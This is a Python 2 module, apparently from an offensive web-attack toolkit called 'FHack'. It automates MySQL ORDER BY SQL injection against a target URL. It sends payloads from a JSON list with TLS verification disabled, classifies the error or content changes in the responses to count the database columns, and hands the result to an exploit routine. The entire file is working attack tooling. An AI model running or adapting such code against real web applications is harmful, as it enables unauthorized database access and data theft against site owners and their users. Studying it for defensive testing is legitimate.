"""
    - created on march/20/2019
    - author topcodermc
    -- [ description of this module:
        test order by phrase for get count of columns in the target database
    ]
"""
try:
    from src.Colors import TextColor
    from Config.WebConfig import define_headerdata
    from extras.OrderErrorType import CheckErrorType
    from extras.GetColumns import GetColumns

    from WebAttack.sqlinjection.modules.exploit.ExploitHandler import ExploitMain

    import requests
    import json

except Exception as error:
    raise SystemExit, TextColor.RED + "[-] Have problem in OrderByInjectionMothods.py as: %s" % error + TextColor.WHITE


class MySqlInjection:

    def __init__(self, url=None, character=None):
        self.character = character  # the character that we used or finding the vulnerabily
        self.url = url

        self.firstResponse = requests.get(url=self.url, headers=define_headerdata, verify=False)

    def __injection__(self):
        with open("./WebAttack/sqlinjection/payloads/OrderByInjectionAndError.json") as jsonFile:
            commandListMysql = json.load(jsonFile)

            for item in commandListMysql["mysql"]["payload"]:

                response = requests.get(url=self.url + self.character + " " + item.replace("value", "1000"),
                                        headers=define_headerdata, verify=False)

                checkErrorType = CheckErrorType(response.text)
                if checkErrorType == 'ErrorBase':
                    '''Error base order'''
                    return {'orderCluase': item, 'errorType': 'ErrorBase'}

                elif checkErrorType == 'ContentBase':
                    '''The content of web application changed when FHack inject the code'''
                    return {'orderCluase': item, 'errorType': 'ContentBase'}

                else:
                    return None


def Start(url, character, db):
    """
    Start testing the payloads
    :return:
    """

    exploitResultOut = dict()
    exploitResultOut['database'] = db
    exploitResultOut['url'] = url
    exploitResultOut['character'] = character

    # step 1 => get error type of injection phrase
    injection = MySqlInjection(url, character)
    outputInjection = injection.__injection__()  # with this method we got order cluase and error type

    # step 2 => get how many columns that this url has
    if outputInjection is not None:
        columns = GetColumns(  # now we get count of columns
            errorType=outputInjection['errorType'],
            orderCluase=character + " " + outputInjection['orderCluase'],
            url=url
        )

        '''
        From here we can know what sqlinjection method we must use for exploiting the url
        '''
        if columns != 0:

            print TextColor.GREEN + "[+] Database has %d columns" % columns

            exploitResultOut['exploit-type'] = 'Classic'
            exploitResultOut['columns'] = columns

        else:

            exploitResultOut['exploit-type'] = 'Classic'
            exploitResultOut['bypass'] = 'need'

        ExploitMain(exploitResultOut)

    else:
        exploitResultOut['exploit-type'] = 'Blind'
